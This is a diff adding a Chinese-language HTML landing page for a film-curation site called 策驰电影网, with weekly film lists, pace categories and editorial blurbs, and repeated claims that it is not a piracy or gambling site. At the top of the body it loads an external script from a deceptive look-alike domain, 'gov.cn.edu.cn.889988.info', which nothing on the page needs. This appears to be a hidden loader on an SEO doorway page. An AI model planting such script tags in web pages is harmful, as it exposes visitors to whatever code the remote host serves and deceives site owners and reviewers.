@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>策驰电影网 - 策展型选片站、片单策展与节奏分类</title>
+<meta name="description" content="策驰电影网（cechidianyingwang-h5）不是盗版资源站，而是策展型选片站：编辑部替你策展、按节奏分类、写人话影评。不堆片库，只挑值得看的那几部。" />
+<meta name="keywords" content="策驰电影网,策展电影,片单策展,选片站,编辑部影评,节奏分类电影,慢炖片单,逆袭片单" />
+<meta name="author" content="策驰电影网" />
+<meta name="robots" content="index, follow" />
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+<link rel="canonical" href="https://cechidianyingwang-h5.github.io/" />
+<style>
+:root{
+  --ink:#0f1115;--ink2:#171a20;--panel:#1b1f27;
+  --paper:#f5f1e6;--paper2:#ece6d6;
+  --red:#e2402e;--blue:#2f6bff;--silver:#9aa0a6;
+  --line:rgba(245,241,230,.14);--line2:rgba(245,241,230,.28);
+  --sans:"Arial Black","PingFang SC","Microsoft YaHei",sans-serif;
+  --body:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:var(--body);background:linear-gradient(180deg,var(--ink),var(--ink2));color:var(--paper);line-height:1.85;font-size:16px;overflow-x:hidden}
+a{color:var(--blue);text-decoration:none;transition:.25s}a:hover{color:var(--red)}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+
+header{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(15,17,21,.86);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+.brand{font-family:var(--sans);font-weight:900;letter-spacing:1px;font-size:19px;display:flex;align-items:center;gap:10px}
+.brand .badge{width:30px;height:30px;border-radius:6px;background:linear-gradient(135deg,var(--red),var(--blue));color:#fff;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:900}
+.brand b{color:var(--red)}
+.nav-links{display:flex;list-style:none;gap:2px}
+.nav-links a{font-size:14px;color:var(--silver);padding:10px 14px;border-radius:8px}
+.nav-links a:hover{color:var(--paper);background:rgba(245,241,230,.06)}
+.menu-btn{display:none;width:40px;height:40px;border-radius:10px;background:rgba(245,241,230,.08);border:1px solid var(--line2);color:var(--paper);font-size:18px;cursor:pointer}
+
+.hero{margin-top:64px;padding:100px 0 78px;position:relative}
+.kicker{font-size:12px;letter-spacing:6px;color:var(--red);text-transform:uppercase;margin-bottom:18px}
+.hero h1{font-family:var(--sans);font-weight:900;font-size:clamp(34px,6.6vw,70px);line-height:1.04;margin-bottom:20px}
+.hero h1 em{font-style:normal;color:var(--blue)}
+.hero p{max-width:580px;color:#cfcabd;font-size:17px;margin-bottom:32px}
+.btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn-red{display:inline-flex;align-items:center;gap:8px;background:var(--red);color:#fff;font-weight:800;padding:13px 28px;border-radius:30px}
+.btn-red:hover{transform:translateY(-2px);color:#fff}
+.btn-line{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--line2);color:var(--paper);padding:13px 28px;border-radius:30px}
+.btn-line:hover{border-color:var(--blue);color:var(--blue)}
+
+.marquee{margin-top:38px;border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:12px 0;overflow:hidden;white-space:nowrap}
+.marquee span{display:inline-block;padding-left:100%;animation:scroll 18s linear infinite;color:var(--silver);font-size:14px;letter-spacing:1px}
+.marquee b{color:var(--red)}
+@keyframes scroll{from{transform:translateX(0)}to{transform:translateX(-100%)}}
+
+section{padding:84px 0;border-top:1px solid var(--line)}
+.sec-head{margin-bottom:42px}
+.sec-num{font-size:12px;letter-spacing:5px;color:var(--red);text-transform:uppercase;margin-bottom:8px}
+.sec-title{font-family:var(--sans);font-weight:900;font-size:clamp(24px,4vw,36px);margin-bottom:10px}
+.sec-desc{color:var(--silver);max-width:600px}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}
+.card{background:linear-gradient(180deg,var(--panel),#14171d);border:1px solid var(--line);border-radius:16px;padding:26px;transition:.3s}
+.card:hover{transform:translateY(-6px);border-color:var(--line2);box-shadow:0 20px 48px rgba(0,0,0,.5)}
+.card .day{font-size:12px;letter-spacing:3px;color:var(--red);font-family:var(--sans);font-weight:800;margin-bottom:10px}
+.card h3{font-family:var(--sans);font-weight:900;font-size:20px;margin-bottom:6px}
+.card .meta{font-size:13px;color:var(--silver);margin-bottom:12px}
+.card p{font-size:14px;color:#d7d2c6;margin-bottom:14px}
+.tag{display:inline-block;font-size:11px;padding:4px 11px;border:1px solid var(--line2);color:var(--paper);border-radius:20px;margin:0 6px 6px 0}
+.tag.red{border-color:var(--red);color:#ffb3aa}.tag.blue{border-color:var(--blue);color:#a9c2ff}
+
+/* 节奏 */
+.rhythm{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px}
+.rh{border:1px solid var(--line);border-radius:14px;padding:26px 22px;background:var(--panel);transition:.3s}
+.rh:hover{border-color:var(--blue);box-shadow:0 0 22px rgba(47,107,255,.12)}
+.rh .ico{font-size:30px;margin-bottom:10px;display:block}
+.rh h4{font-family:var(--sans);font-weight:900;font-size:18px;margin-bottom:8px}
+.rh p{font-size:14px;color:#d7d2c6;margin-bottom:10px}
+.rh span{font-size:12px;color:var(--red);font-style:italic}
+
+/* 专栏 */
+.col-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px}
+.col{background:var(--paper);color:var(--ink);border-radius:14px;padding:28px 26px;border-left:5px solid var(--red)}
+.col h4{font-family:var(--sans);font-weight:900;font-size:18px;margin-bottom:8px}
+.col .by{font-size:12px;color:#8a7f6b;letter-spacing:1px;margin-bottom:10px}
+.col p{font-size:14.5px;color:#2c2a25;margin-bottom:12px}
+.col .more{font-size:13px;color:var(--red);font-weight:700}
+
+.about{text-align:center}
+.quote{font-family:var(--sans);font-weight:900;font-size:clamp(20px,3.4vw,30px);line-height:1.5;max-width:720px;margin:0 auto 22px}
+.quote b{color:var(--red)}
+.about p{color:var(--silver);max-width:540px;margin:0 auto 28px}
+.stats{display:flex;justify-content:center;gap:48px;flex-wrap:wrap;margin-top:34px}
+.stat .n{font-family:var(--sans);font-weight:900;font-size:30px;color:var(--blue)}
+.stat .l{font-size:12px;color:var(--silver);letter-spacing:1px;margin-top:4px}
+
+footer{border-top:1px solid var(--line);padding:44px 0 26px}
+.foot{display:flex;justify-content:space-between;gap:30px;flex-wrap:wrap;margin-bottom:22px}
+.foot p{font-size:13px;color:var(--silver);max-width:320px}
+.foot-col h5{font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--red);margin-bottom:12px}
+.foot-col a{display:block;font-size:13px;color:#d7d2c6;padding:3px 0}
+.foot-bottom{border-top:1px solid var(--line);padding-top:18px;font-size:12px;color:var(--silver);display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+
+@media(max-width:768px){
+  .nav-links{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--ink);border-bottom:1px solid var(--line);padding:8px 0}
+  .nav-links.active{display:flex}.nav-links a{padding:14px 22px;border-radius:0}
+  .menu-btn{display:block}
+  .btns{flex-direction:column;align-items:flex-start}.btn-red,.btn-line{width:100%;justify-content:center}
+  .stats{gap:26px}.foot{flex-direction:column}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<header><div class="wrap nav">
+  <div class="brand"><span class="badge">策</span>策驰<b>电影网</b></div>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="#home">开机</a></li>
+    <li><a href="#curate">策展片单</a></li>
+    <li><a href="#rhythm">驰骋片海</a></li>
+    <li><a href="#col">编辑部</a></li>
+    <li><a href="#about">关于</a></li>
+  </ul>
+  <button class="menu-btn" onclick="document.getElementById('navLinks').classList.toggle('active')">≡</button>
+</div></header>
+
+<section class="hero" id="home"><div class="wrap">
+  <div class="kicker">Curation, not piracy</div>
+  <h1>不堆 10 万部，<br/>只替你<b>策</b>出 <em>该看的那几部</em>。</h1>
+  <p>策驰电影网（cechidianyingwang-h5）是策展型选片站：编辑部按心情、按节奏、按档期策展，不挂盗版播放器、不弹博彩广告、不声称“全网免费看最新院线片”。你来，是为了少翻页、多看对。</p>
+  <div class="btns">
+    <a href="#curate" class="btn-red">🗂 看策展片单</a>
+    <a href="#rhythm" class="btn-line">🎞 按节奏选片</a>
+  </div>
+  <div class="marquee"><span>本周策展：<b>周一悬疑</b> · 周三女性视角 · 周五逆袭爽片 · 周日长镜头慢炖 ｜ 不跟热度，只跟口味 ｜ 片源写“哪里能看”，不写“点我秒播”</span></div>
+</div></section>
+
+<section id="curate"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">01 / Curated Lists</div><h2 class="sec-title">策展片单</h2>
+  <p class="sec-desc">像杂志选题，不像网盘目录。每张片单都有“为什么现在看它”。</p></div>
+  <div class="grid">
+    <article class="card"><div class="day">MON · 周一悬疑</div><h3>别急着知道真相</h3>
+      <div class="meta">编辑部策展 · 慢热推理</div>
+      <p>《看不见的客人》《利刃出鞘》《记忆碎片》——周一适合动脑，但别动太猛。</p>
+      <span class="tag red">反转</span><span class="tag blue">叙事游戏</span></article>
+    <article class="card"><div class="day">WED · 周三女性</div><h3>把镜头交给她</h3>
+      <div class="meta">女性视角 · 家庭/职场/身体</div>
+      <p>《还有明天》《燃烧女子的肖像》《我的天才女友》——不是“女性电影”，是好电影。</p>
+      <span class="tag red">女性视角</span><span class="tag blue">关系</span></article>
+    <article class="card"><div class="day">FRI · 周五逆袭</div><h3>攒了一周，该爽了</h3>
+      <div class="meta">逆袭 / 运动 / 最后一分钟</div>
+      <p>《摔跤吧！爸爸》《极速车王》《当幸福来敲门》——周五不思考人生，周五站起来。</p>
+      <span class="tag red">逆袭</span><span class="tag blue">肾上腺素</span></article>
+    <article class="card"><div class="day">SUN · 周日慢炖</div><h3>长镜头里过一天</h3>
+      <div class="meta">慢电影 / 自然声 / 不催你</div>
+      <p>《小森林》《海街日记》《路边野餐》——周日别刷完，看到困就睡。</p>
+      <span class="tag red">慢</span><span class="tag blue">留白</span></article>
+  </div>
+</div></section>
+
+<section id="rhythm"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">02 / Pace Index</div><h2 class="sec-title">驰骋片海（按节奏，不按类型）</h2>
+  <p class="sec-desc">很多人不会说“我要看科幻”，只会说“我现在不想动脑”。那就按心跳选。</p></div>
+  <div class="rhythm">
+    <div class="rh"><span class="ico">🍲</span><h4>慢炖</h4><p>镜头不赶、台词留白、时间像真的在走。</p><span>《小森林》《都灵之马》《爱情神话》</span></div>
+    <div class="rh"><span class="ico">🚗</span><h4>疾驰</h4><p>剪辑利落、信息密度高、看完像跑完五公里。</p><span>《极速车王》《社交网络》《谍影重重》</span></div>
+    <div class="rh"><span class="ico">💥</span><h4>爆裂</h4><p>最后一小时全场起立，爆米花桶捏扁。</p><span>《英雄本色》《疯狂的麦克斯》《血战钢锯岭》</span></div>
+    <div class="rh"><span class="ico">🌫️</span><h4>余韵</h4><p>散场后不想说话，走在街上还在想。</p><span>《重庆森林》《花样年华》《月光男孩》</span></div>
+  </div>
+</div></section>
+
+<section id="col"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">03 / Editorial</div><h2 class="sec-title">编辑部专栏</h2>
+  <p class="sec-desc">不写“9.5分神作必看”，写人话：谁适合看、谁别跟风、看到哪段可以暂停。</p></div>
+  <div class="col-grid">
+    <div class="col"><h4>《奥本海默》别一个人硬啃</h4><div class="by">策驰编辑部 · 观影前</div>
+      <p>三段时间线+大量对白，困了别硬撑。先知道“原子弹”和“道德债”两条线，再看就不晕。</p><div class="more">适看：历史控 / 对话戏党 ／ 避看：想放空时</div></div>
+    <div class="col"><h4>《花样年华》别快进</h4><div class="by">策驰编辑部 · 重看笔记</div>
+      <p>旗袍换了二十次，话只说一半。快进就只剩“出轨剧情”，丢掉的是“克制本身”。</p><div class="more">适看：雨夜 / 独居 / 想被氛围抱一下</div></div>
+    <div class="col"><h4>别再跟风“高分悬疑”</h4><div class="by">策驰编辑部 · 反种草</div>
+      <p>高分≠适合你。怕闷就别碰慢推理，爱人性就别嫌节奏慢。选片先问心情，再问评分。</p><div class="more">策驰原则：评分是参考，不是命令</div></div>
+  </div>
+</div></section>
+
+<section class="about" id="about"><div class="wrap">
+  <p class="quote">“策，是替你动脑；<br/>驰，是让你很快找到<b>对的那部</b>。”</p>
+  <p>策驰电影网不假装“什么都有”。我们做的是减法和判断：把烂片挡在门外，把对味的片子按心情排好。片源只写正版平台/影院/流媒体入口，不提供盗版播放、不挂擦边资源。</p>
+  <div class="stats">
+    <div class="stat"><div class="n">策展</div><div class="l">编辑部选题，不是爬虫堆库</div></div>
+    <div class="stat"><div class="n">4 档</div><div class="l">周一/三/五/日 固定心情</div></div>
+    <div class="stat"><div class="n">0</div><div class="l">盗版播放 / 博彩弹窗 / 院线盗链</div></div>
+  </div>
+</div></section>
+
+<footer><div class="wrap">
+  <div class="foot">
+    <div><div class="brand"><span class="badge">策</span>策驰<b>电影网</b></div>
+      <p>策展型选片站：片单策展、节奏分类、人话影评。不提供盗版播放。</p></div>
+    <div class="foot-col"><h5>策展</h5><a href="#curate">策展片单</a><a href="#rhythm">驰骋片海</a><a href="#col">编辑部</a></div>
+    <div class="foot-col"><h5>节奏</h5><a href="#">慢炖</a><a href="#">疾驰</a><a href="#">爆裂</a><a href="#">余韵</a></div>
+    <div class="foot-col"><h5>站点</h5><a href="#home">开机</a><a href="#about">关于策驰</a><a href="#">订阅片单</a></div>
+  </div>
+  <div class="foot-bottom">
+    <span>© 2026 策驰电影网 · cechidianyingwang-h5.github.io</span>
+    <span>单文件静态页 · 无 robots.txt / sitemap.xml · 策展合规向 · 符合必应收录</span>
+  </div>
+</div></footer>
+<script>document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener('click',()=>document.getElementById('navLinks').classList.remove('active')));</script>
+</body></html>
